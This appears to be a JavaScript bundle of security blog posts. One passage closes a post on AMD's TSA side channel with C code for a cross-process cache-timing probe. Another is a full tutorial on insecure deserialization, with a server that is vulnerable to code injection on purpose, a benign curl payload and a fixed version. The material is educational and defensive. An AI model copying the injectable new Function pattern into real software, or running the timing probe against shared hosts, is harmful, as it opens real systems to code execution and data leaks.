<p>This looks similar to the timing setups in CPU side-channel courses and Spectre labs, where you average many samples to separate cache hits from misses.</p>
<div class="markdown-heading"><h3 class="heading-element">4.3 Splitting victim and attacker (two processes, shared memory)</h3><a id="user-content-43-splitting-victim-and-attacker-two-processes-shared-memory" class="anchor" aria-label="Permalink: 4.3 Splitting victim and attacker (two processes, shared memory)" href="#43-splitting-victim-and-attacker-two-processes-shared-memory"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>To make the lab feel more like a <strong>cross-process leak</strong> (closer to TSA’s “other context” threat model), you can separate victim and attacker into <strong>two processes</strong> that share memory via <code>shm_open</code> / <code>mmap</code>.</p>
<p><strong>Shared header:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// common.h</span>
<span class="pl-k">#pragma</span> once
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> {
    <span class="pl-smi">uint8_t</span> <span class="pl-c1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">stop</span>;      <span class="pl-c">// flag to tell victim to stop</span>
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">ready</span>;     <span class="pl-c">// flag for simple sync</span>
};</pre></div>
<p><strong>Victim process:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// victim.c</span>
<span class="pl-c">// gcc -O2 -march=native -o victim victim.c -lrt</span>

<span class="pl-k">#include</span> <span class="pl-s">"common.h"</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;sys/mman.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;fcntl.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>

<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x7F</span>;

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-smi">int</span> <span class="pl-s1">fd</span> <span class="pl-c1">=</span> <span class="pl-en">shm_open</span>(<span class="pl-s">"/tsa_demo"</span>, <span class="pl-c1">O_RDWR</span> | <span class="pl-c1">O_CREAT</span>, <span class="pl-c1">0600</span>);
    <span class="pl-en">ftruncate</span>(<span class="pl-s1">fd</span>, <span class="pl-k">sizeof</span>(<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span>));
    <span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span> <span class="pl-c1">=</span> <span class="pl-en">mmap</span>(<span class="pl-c1">NULL</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">*</span><span class="pl-s1">sh</span>),
                                    <span class="pl-c1">PROT_READ</span> | <span class="pl-c1">PROT_WRITE</span>,
                                    <span class="pl-c1">MAP_SHARED</span>, <span class="pl-s1">fd</span>, <span class="pl-c1">0</span>);

    <span class="pl-c">// Initialize</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">ready</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span>;

    <span class="pl-k">while</span> (!<span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">stop</span>) {
        <span class="pl-c">// attacker_hint could be communicated via shared memory too;</span>
        <span class="pl-c">// here we just fix it for simplicity</span>
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x11</span>;
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;
        <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;
        __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
    }

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p><strong>Attacker process:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// attacker.c</span>
<span class="pl-c">// gcc -O2 -march=native -o attacker attacker.c -lrt</span>

<span class="pl-k">#include</span> <span class="pl-s">"common.h"</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;sys/mman.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;fcntl.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-smi">uint32_t</span> <span class="pl-en">time_access</span>(<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span>, <span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-smi">unsigned</span> <span class="pl-s1">aux</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    <span class="pl-k">return</span> (<span class="pl-smi">uint32_t</span>)(<span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>);
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-smi">int</span> <span class="pl-s1">fd</span> <span class="pl-c1">=</span> <span class="pl-en">shm_open</span>(<span class="pl-s">"/tsa_demo"</span>, <span class="pl-c1">O_RDWR</span>, <span class="pl-c1">0600</span>);
    <span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span> <span class="pl-c1">=</span> <span class="pl-en">mmap</span>(<span class="pl-c1">NULL</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">*</span><span class="pl-s1">sh</span>),
                                    <span class="pl-c1">PROT_READ</span> | <span class="pl-c1">PROT_WRITE</span>,
                                    <span class="pl-c1">MAP_SHARED</span>, <span class="pl-s1">fd</span>, <span class="pl-c1">0</span>);

    <span class="pl-c">// Wait for victim to init</span>
    <span class="pl-k">while</span> (!<span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">ready</span>) { }

    <span class="pl-c">// Flush cache lines first</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }

    <span class="pl-c">// Give victim some time to run and "prime" one line</span>
    <span class="pl-en">usleep</span>(<span class="pl-c1">10000</span>);

    <span class="pl-smi">uint32_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint32_t</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-en">time_access</span>(<span class="pl-s1">sh</span>, <span class="pl-s1">idx</span>);
        <span class="pl-k">if</span> (<span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">t</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index (cross-proc) = %d, time = %u cycles\\n"</span>,
           <span class="pl-s1">best_idx</span>, <span class="pl-s1">best_time</span>);

    <span class="pl-c">// Tell victim to stop</span>
    <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">stop</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span>;

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>This is closer in spirit to <strong>“victim in one context, attacker in another”</strong>, even though they’re still on the same OS and sharing memory explicitly. Real TSA removes that explicit sharing: instead of a shared array, the “shared state” is the CPU’s internal scheduler, store queue, and L1 cache.</p>
<div class="markdown-heading"><h3 class="heading-element">4.4 Connecting the lab back to TSA</h3><a id="user-content-44-connecting-the-lab-back-to-tsa" class="anchor" aria-label="Permalink: 4.4 Connecting the lab back to TSA" href="#44-connecting-the-lab-back-to-tsa"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Right after these code sections, the key takeaway is:</p>
<ul>
<li>
<p>Our toy lab uses <strong>cache presence</strong> as the side-channel signal (classic Flush+Reload / Prime+Probe).</p>
</li>
<li>
<p>TSA uses <strong>scheduler timing</strong> as the side-channel signal:</p>
<ul>
<li>False completions → invalid data forwarded → different dependency chains → different timing.</li>
</ul>
</li>
<li>
<p>In both cases, the attacker:</p>
<ol>
<li>
<strong>Influences</strong> microarchitectural state (priming),</li>
<li>Lets a victim touch secret-dependent data (access pattern),</li>
<li>Measures a <strong>timing difference</strong> in its own code,</li>
<li>Reconstructs bits of the secret over many trials.</li>
</ol>
</li>
</ul>
<p>That’s the mental bridge you want readers to cross.</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">5. Mitigations: what AMD, OSs, and clouds are doing</h2><a id="user-content-5-mitigations-what-amd-oss-and-clouds-are-doing" class="anchor" aria-label="Permalink: 5. Mitigations: what AMD, OSs, and clouds are doing" href="#5-mitigations-what-amd-oss-and-clouds-are-doing"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>TSA mitigations span firmware, OS, and virtualization layers.</p>
<div class="markdown-heading"><h3 class="heading-element">5.1 Microcode + VERW</h3><a id="user-content-51-microcode--verw" class="anchor" aria-label="Permalink: 5.1 Microcode + VERW" href="#51-microcode--verw"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD ships updated <strong>microcode</strong> for vulnerable Family 19h CPUs. On top of that, they recommend using the memory form of the <code>VERW</code> instruction as a “microarchitectural scrub”:</p>
<ul>
<li>New CPUID bits tell software:
<ul>
<li>Whether TSA-L1 / TSA-SQ are not present,</li>
<li>Whether the CPU supports TSA mitigation via <code>VERW_CLEAR</code>.</li>
</ul>
</li>
<li>With appropriate microcode loaded, <strong>CPL0 (kernel / hypervisor)</strong> can execute <code>VERW</code> to clear TSA-relevant structures when crossing trust boundaries, e.g.:
<ul>
<li>Kernel → user transitions,</li>
<li>Hypervisor → guest VM transitions,</li>
<li>Before entering low-power states.</li>
</ul>
</li>
</ul>
<p>This is similar in spirit to existing post-Spectre mitigations (IBPB, STIBP, etc.) but targeted at scheduler structures.</p>
<div class="markdown-heading"><h3 class="heading-element">5.2 Linux <code>MITIGATION_TSA</code> and <code>tsa=</code> knob</h3><a id="user-content-52-linux-mitigation_tsa-and-tsa-knob" class="anchor" aria-label="Permalink: 5.2 Linux MITIGATION_TSA and tsa= knob" href="#52-linux-mitigation_tsa-and-tsa-knob"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Linux added explicit support for TSA mitigations:</p>
<ul>
<li>A new Kconfig option <code>MITIGATION_TSA</code> gates TSA-related logic.</li>
<li>A boot parameter <code>tsa=</code> controls behavior (e.g., always on, only for user/kernel transitions, only guest/host transitions, or disabled).</li>
<li>Combined with updated microcode from <code>linux-firmware</code>, this lets distros tune performance vs security trade-offs depending on threat model.</li>
</ul>
<div class="markdown-heading"><h3 class="heading-element">5.3 SEV-SNP and attestation</h3><a id="user-content-53-sev-snp-and-attestation" class="anchor" aria-label="Permalink: 5.3 SEV-SNP and attestation" href="#53-sev-snp-and-attestation"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>For AMD’s <strong>SEV-SNP</strong> (encrypted VM) environments:</p>
<ul>
<li>TSA could, in principle, allow a malicious hypervisor to infer SEV-SNP guest data.</li>
<li>Microcode and firmware updates aim to automatically mitigate TSA for SEV-SNP guests.</li>
<li>Guest owners are expected to:
<ul>
<li>Verify via <strong>attestation</strong> that the host is running the right microcode,</li>
<li>Confirm that TSA mitigations are active before trusting the platform.</li>
</ul>
</li>
</ul>
<hr>
<div class="markdown-heading"><h2 class="heading-element">6. What red teams and blue teams should actually do</h2><a id="user-content-6-what-red-teams-and-blue-teams-should-actually-do" class="anchor" aria-label="Permalink: 6. What red teams and blue teams should actually do" href="#6-what-red-teams-and-blue-teams-should-actually-do"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<div class="markdown-heading"><h3 class="heading-element">6.1 For red teams</h3><a id="user-content-61-for-red-teams" class="anchor" aria-label="Permalink: 6.1 For red teams" href="#61-for-red-teams"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>TSA probably won’t be your <strong>first</strong> move in a real engagement, but it’s worth understanding as part of a modern attack surface:</p>
<ul>
<li>
<strong>Model it as a capability</strong>:
<ul>
<li>“Given local code execution on a shared AMD Zen 3/4 host, I may be able to leak bits of privileged data over time.”</li>
</ul>
</li>
<li>
<strong>Think in campaigns, not single shots</strong>:
<ul>
<li>Meeting the timing conditions and noise requirements means you want long-lived footholds and repeated victim activity.</li>
</ul>
</li>
<li>
<strong>Use it to stress test cloud models</strong>:
<ul>
<li>Ask: “If I’m a rogue tenant on this EPYC host, what’s the maximum <em>theoretical</em> data I can extract from neighbors?”</li>
</ul>
</li>
</ul>
<p>TSA is a great hook for talks and blogs because it forces teams to think beyond “network perimeter” and even beyond “syscall boundary.” The CPU itself is part of the threat surface.</p>
<div class="markdown-heading"><h3 class="heading-element">6.2 For blue teams</h3><a id="user-content-62-for-blue-teams" class="anchor" aria-label="Permalink: 6.2 For blue teams" href="#62-for-blue-teams"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Concrete actions:</p>
<ol>
<li>
<p><strong>Patch like this is Meltdown-class, not just ‘medium CVSS’</strong></p>
<ul>
<li>Make sure:
<ul>
<li>Firmware/microcode is up to date for all Family 19h platforms,</li>
<li>OS / hypervisor builds include TSA mitigations and have <code>tsa=</code> configured appropriately.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Re-evaluate your multi-tenant risk</strong></p>
<ul>
<li>In clouds and shared hosting:
<ul>
<li>Understand which SKUs are affected,</li>
<li>Decide whether you treat TSA as an academic curiosity or something you must mitigate for specific tenants (e.g., high-sensitivity workloads).</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Include TSA in your threat modeling</strong></p>
<ul>
<li>It’s an <strong>info-leak primitive</strong>, not an RCE.</li>
<li>Combine it mentally with other bugs:
<ul>
<li>RCE → TSA → secret exfiltration → crypto break → lateral movement.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Watch for performance regressions</strong></p>
<ul>
<li>VERW-based mitigations may hurt performance; you’ll need to benchmark and possibly make different choices per environment (internal dev vs multi-tenant cloud vs regulated workloads).</li>
</ul>
</li>
</ol>
<hr>
`,Zg=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server</h1>
    <blockquote>
      <p>"Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation." — OWASP</p>
    </blockquote>
    <p>CVE-2025-55182 ("React2Shell") pushed insecure deserialization back into the spotlight:</p>
    <ul>
      <li>It’s a CVSS 10.0 RCE in <strong>React Server Components</strong> (RSC).</li>
      <li>The bug lives in the <strong>Flight protocol</strong> used by RSC: attacker-controlled data is <strong>deserialized unsafely</strong>, letting crafted objects influence server-side execution and achieve code execution on the Node.js server.</li>
    </ul>
    <p>You absolutely shouldn’t be testing real React2Shell payloads against anything but an isolated lab. But you <em>can</em> understand the core pattern with a <strong>tiny, self-contained Node.js example</strong> that mimics the same <em>class</em> of bug: deserialization of untrusted data → treating it as special internal objects → executing attacker-controlled behavior.</p>
    <p>This post walks through:</p>
    <ul>
      <li>A quick refresher on insecure deserialization.</li>
      <li>A <strong>toy "fake Flight" server</strong> in Node/Express that’s intentionally vulnerable.</li>
      <li>A harmless "payload" that only evaluates math.</li>
      <li>A safer version of the same endpoint.</li>
      <li>How this maps conceptually to real-world bugs like React2Shell.</li>
    </ul>
    <hr />
    <h2>1. Insecure deserialization in one paragraph</h2>
    <p>Insecure deserialization is when an application takes <strong>untrusted data</strong>, deserializes it into objects, and then uses those objects in ways that let an attacker:</p>
    <ul>
      <li>Manipulate logic,</li>
      <li>Abuse "magic" methods or callbacks,</li>
      <li>Or even <strong>execute arbitrary code</strong>.</li>
    </ul>
    <p>That’s why it shows up in the OWASP Top 10 and is treated as a high-risk category: unsafe deserialization logic can be a straight path to RCE.</p>
    <p>React2Shell is a modern instance of this: the server <strong>deserializes Flight payloads</strong> and interprets them as internal “Chunk” objects. Because that deserialization didn’t sufficiently validate or constrain what those objects could look like, attackers found a way to make React resolve <em>fake</em> chunks and end up running arbitrary JavaScript on the server.</p>
    <p>Let’s recreate that <em>pattern</em> in a tiny Node app.</p>
    <hr />
    <h2>2. A tiny "fake Flight" server (intentionally vulnerable)</h2>
    <p>We’ll build a Node/Express server that:</p>
    <ul>
      <li>Accepts a JSON payload that looks like a "slot map" (<code>"0"</code>, <code>"1"</code>, etc.).</li>
      <li>Pulls out slot <code>"1"</code> as a <strong>"chunk"</strong>.</li>
      <li>Treats any chunk with a <code>then</code> field as special.</li>
      <li>Calls a handler based on <code>chunk.then</code>.</li>
      <li>Uses <code>chunk._expr</code> inside <code>new Function()</code>.</li>
    </ul>
    <p>This is obviously unsafe; that’s the point. It’s a simplified version of the larger deserialization &amp; "thenable" handling patterns described in real-world React2Shell writeups.</p>
    <h3>2.1 Setup</h3>
    <pre><code class="language-bash">mkdir fake-flight-lab
cd fake-flight-lab
npm init -y
npm install express body-parser</code></pre>
    <h3>2.2 Vulnerable server (<code>server-vuln.js</code>)</h3>
    <pre><code class="language-javascript">const express = require("express");
const bodyParser = require("body-parser");

const app = express();
app.use(bodyParser.json());

// --- Fake "chunk" resolver (vulnerable) ---

// Very naive "promise-like" resolver: if an object has a \`then\` field,
// we treat it as something that needs to be "resolved" via a handler.
const thenHandlers = {
  // Our "legit" handler; mapping is attacker-controllable in this toy
  logAndEval: function (chunk, response) {
    console.log("[*] logAndEval called with chunk:", chunk);

    // Attacker-controlled field:
    const expr = chunk._expr;

    // VULNERABLE: directly compile and run attacker-controlled string.
    // In real bugs, this might be an internal expression or dynamic call.
    const fn = new Function(\`return (\${expr});\`);

    const result = fn();
    response.value = result;
  },
};

// Fake "Flight" endpoint
app.post("/fake-flight", (req, res) => {
  const payload = req.body;

  console.log("[*] Received payload:", JSON.stringify(payload, null, 2));

  // Pick slot "1" as our main "chunk"
  const chunk = payload["1"];
  const response = { value: null };

  try {
    // VULN #1: trust that whatever is in \`chunk.then\` is a valid handler name
    const handlerName = chunk.then;

    // VULN #2: look it up dynamically without validation
    const handler = thenHandlers[handlerName];

    if (typeof handler !== "function") {
      throw new Error("No such handler");
    }

    // Call the handler with the (attacker-controlled) chunk
    handler(chunk, response);

    // Serialize the result
    res.json({
      ok: true,
      result: response.value,
    });
  } catch (e) {
    console.error("[!] Error while processing fake-flight payload:", e);
    res.status(500).json({ ok: false, error: e.message });
  }
});

app.listen(3000, () => {
  console.log("VULN fake-flight server listening on http://localhost:3000");
});</code></pre>
    <p>What’s insecure here:</p>
    <ul>
      <li>We treat any object with <code>.then</code> as special and use that field to <strong>control which function runs</strong>.</li>
      <li>We take a string from <code>_expr</code> and feed it straight into <code>new Function</code> → arbitrary code path inside the Node process. This mirrors how insecure deserialization can escalate into code execution in real apps.</li>
    </ul>
    <hr />
    <h2>3. A harmless "malicious" payload (just math)</h2>
    <p>Start the server:</p>
    <pre><code class="language-bash">node server-vuln.js</code></pre>
    <p>Now send a JSON payload that looks suspiciously like a "chunk":</p>
    <pre><code class="language-bash">curl -X POST http://localhost:3000/fake-flight   -H "Content-Type: application/json"   -d '{
    "0": "meta",
    "1": {
      "status": "resolved_model",
      "_expr": "1 + 2 + 3 * 4",
      "then": "logAndEval"
    }
  }'</code></pre>
    <p>What happens:</p>
    <ol>
      <li>The server reads <code>payload["1"]</code> into <code>chunk</code>.</li>
      <li>It sees <code>chunk.then === "logAndEval"</code> and calls <code>thenHandlers.logAndEval(chunk, response)</code>.</li>
      <li><code>logAndEval</code> pulls <code>chunk._expr</code> (<code>"1 + 2 + 3 * 4"</code>).</li>
      <li>It builds <code>new Function("return (" + expr + ");")</code> → <code>new Function("return (1 + 2 + 3 * 4);")</code>.</li>
      <li>Executes it and returns:</li>
    </ol>
    <pre><code class="language-json">{
  "ok": true,
  "result": 15
}</code></pre>
    <p>This is benign — we only evaluated a math expression — but structurally we’ve reproduced the core pattern:</p>
    <ul>
      <li><strong>Attacker controls object fields</strong> (<code>then</code>, <code>_expr</code>) in the deserialized payload.</li>
      <li>The server uses those fields to <strong>drive control flow</strong> (which handler to run) and <strong>compose code to execute</strong>.</li>
    </ul>
    <p>That’s exactly the kind of chain OWASP warns about: untrusted data being deserialized and then used to manipulate object attributes or insert new ones, leading to logic abuse or code execution.</p>
    <hr />
    <h2>4. Fixing the toy: structured data, no <code>new Function</code></h2>
    <p>Now let’s add a <strong>safe</strong> variant of the same endpoint, so you can see what “good” looks like in contrast.</p>
    <h3>4.1 Safer handler</h3>
    <p>Add this to the same file (or a new one):</p>
    <pre><code class="language-javascript">// --- Safer variant: explicit, whitelisted operations only ---

const SAFE_OPS = new Set(["add", "mul"]);

function safeEvalExpression(op, a, b) {
  if (!SAFE_OPS.has(op)) {
    throw new Error("Unsupported op");
  }
  a = Number(a);
  b = Number(b);
  if (Number.isNaN(a) || Number.isNaN(b)) {
    throw new Error("Invalid numbers");
  }
  return op === "add" ? a + b : a * b;
}

app.post("/fake-flight-safe", (req, res) => {
  const payload = req.body;
  const chunk = payload["1"];
  const response = { value: null };

  try {
    // Validate structure explicitly
    if (!chunk || chunk.status !== "resolved_model") {
      throw new Error("bad status");
    }

    const { op, a, b } = chunk;

    const result = safeEvalExpression(op, a, b);
    response.value = result;

    res.json({ ok: true, result: response.value });
  } catch (e) {
    console.error("[!] Error in safe endpoint:", e);
    res.status(400).json({ ok: false, error: e.message });
  }
});</code></pre>
    <p>Now call:</p>
    <pre><code class="language-bash">curl -X POST http://localhost:3000/fake-flight-safe   -H "Content-Type: application/json"   -d '{
    "1": {
      "status": "resolved_model",
      "op": "add",
      "a": 10,
      "b": 20
    }
  }'</code></pre>
    <p>You should see:</p>
    <pre><code class="language-json">{
  "ok": true,
  "result": 30
}</code></pre>
    <p>Here we:</p>
    <ul>
      <li><strong>Don’t</strong> treat <code>then</code> as a magic field.</li>
      <li><strong>Don’t</strong> run arbitrary expressions.</li>
      <li><strong>Do</strong>:
        <ul>
          <li>Validate fields,</li>
          <li>Constrain operations to a whitelist,</li>
          <li>Coerce types.</li>
        </ul>
      </li>
    </ul>
    <p>This matches common guidance on safe deserialization: define a strict schema, validate all fields, and never deserialize directly into objects with behavior (callbacks, dynamic code) that can be triggered by untrusted data.</p>
    <hr />
    <h2>5. Mapping this toy back to React2Shell</h2>
    <p>Real-world CVE-2025-55182 is obviously more complex, but the <em>shape</em> of the bug is similar:</p>
    <ul>
      <li>RSC has a <strong>Flight protocol</strong> with a structured payload (slots, references, status codes).</li>
      <li>The server <strong>deserializes</strong> that payload into internal “Chunks”.</li>
      <li>Those chunks are treated like promise-like objects and resolved using their <code>then</code> and related fields.</li>
      <li>Because the code did not sufficiently validate or lock down the structure, <strong>attacker-supplied objects</strong> can be interpreted as internal chunks, and their fields end up influencing internal callbacks and state — eventually leading to arbitrary JS execution in the Node process.</li>
    </ul>
    <p>Security writeups on React2Shell repeatedly describe it as an <strong>unsafe / insecure deserialization flaw in the Flight protocol</strong>: untrusted data, parsed into internal structures, used to control resolution logic and server-side behavior.</p>
    <p>This toy example gives you a mental model to read those writeups:</p>
    <ul>
      <li>Anywhere you see “fake Chunk objects”, think: <em>our <code>chunk</code> object with attacker-controlled fields</em>.</li>
      <li>Anywhere you see “thenable abused”, think: <em>our <code>chunk.then</code> controlling which function runs</em>.</li>
      <li>Anywhere you see “code injected into internal expression”, think: <em>our <code>_expr</code> string passed into <code>new Function()</code></em>.</li>
    </ul>
    <hr />
    <h2>6. Takeaways for your own code</h2>
    <p>Whether or not you ever touch React Server Components, this pattern shows up everywhere:</p>
    <ul>
      <li>JSON / binary payloads mapped into "magic" objects.</li>
      <li>ORMs or serializers that hydrate classes with methods and hooks.</li>
      <li>Message formats that allow callbacks or special fields (<code>__proto__</code>, <code>then</code>, <code>_onLoad</code>, etc.).</li>
    </ul>
    <p>To avoid ending up in the same situation:</p>
    <ol>
      <li><strong>Don’t deserialize untrusted data into rich objects with behavior.</strong><br />Deserialize into plain data structures and validate them first.</li>
      <li><strong>Treat protocol fields like code, not just data.</strong><br />Anything that controls which function gets called (<code>then</code>, <code>type</code>, <code>handler</code>) needs strict allowlists.</li>
      <li><strong>Never <code>eval</code> / <code>new Function</code> on data from the network.</strong><br />If you really must interpret expressions, constrain them to a safe DSL and sandbox heavily.</li>
      <li><strong>For complex protocols (like Flight), write fuzzers and negative tests.</strong><br />When you see a deserializer that:
        <ul>
          <li>Builds graphs of objects,</li>
          <li>Treats some fields specially,</li>
          <li>Traverses prototypes / thenables…<br />…that’s a huge red flag and deserves targeted testing.</li>
        </ul>
      </li>
    </ol>
  </div>
</body>
</html>
`,Jg=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>Who Can Touch Your Kernel? Auditing <code>/boot/vmlinuz-*</code> on Linux</h1>
    <p>When we talk about “protecting a Linux system,” most people think of:</p>
    <ul>
      <li>Patching services</li>
      <li>Hardening SSH</li>
      <li>Watching logs</li>
    </ul>
    <p>Almost nobody starts with the question:</p>
    <blockquote>
      <p><strong>“Who can modify my kernel image?”</strong></p>
    </blockquote>
    <p>On a typical Linux machine, that kernel image lives in files like:</p>
    <pre><code class="language-bash">/boot/vmlinuz-6.8.0-35-generic
/boot/vmlinuz-5.15.0-91-generic</code></pre>
    <p>These are not just random binaries. They <em>are</em> the operating system’s core. If an attacker can silently replace them, everything above the kernel—processes, containers, even security tools—runs on top of a compromised foundation.</p>
    <p>In this post, we’ll explore:</p>
    <ul>
      <li>What <code>/boot/vmlinuz-*</code> actually is</li>
      <li>Which code <strong>must</strong> be allowed to modify it</li>
      <li>Which code <strong>shouldn’t</strong> but still technically can</li>
      <li>How to start <strong>detecting risky conditions</strong> with a detailed Python audit script</li>
    </ul>
    <p>All from a defensive, “threat-model my own box” point of view.</p>
    <hr />
    <h2>1. What lives in <code>/boot/vmlinuz-*</code>?</h2>
    <p>On most distros, you’ll see files like:</p>
    <pre><code class="language-bash">ls -l /boot/vmlinuz-*
